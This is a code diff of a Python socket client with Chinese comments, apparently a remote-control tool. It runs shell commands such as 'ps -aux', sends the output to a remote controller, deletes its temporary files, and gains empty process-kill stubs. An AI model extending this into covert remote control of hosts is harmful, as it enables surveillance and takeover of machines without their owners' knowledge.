@@ -107,8 +107,7 @@ def Process(sock):
         os.system('del /f /q C:\\ProgramData\\info.txt')
         return
     else:
-        os.system('echo posix@ > info.txt')
-        os.system('uname -a >> info.txt')
+        os.system('ps -aux >> info.txt')
         f = open('info.txt','r')
         data = f.read()
         f.close()
@@ -117,6 +116,14 @@ def Process(sock):
         sock.send(b'End')
         os.system('rm -f info.txt')
         return
+
+# Kill进程 by Name
+def KillName(sock):
+    return
+
+# Kill进程 by ID
+def KillId(sock):
+    return
 
 # 主程序
 if ACTIVE == 0:
@@ -140,4 +147,10 @@ while True:
         GetMoreinfo(s,'USB')
     elif d == b'2':
         Process(s)
+    elif d == b'2x01':
+        KillName(s)
+    elif d == b'2x02':
+        KillId(s)
+    elif d == b'2x03':
+        break
 s.close()
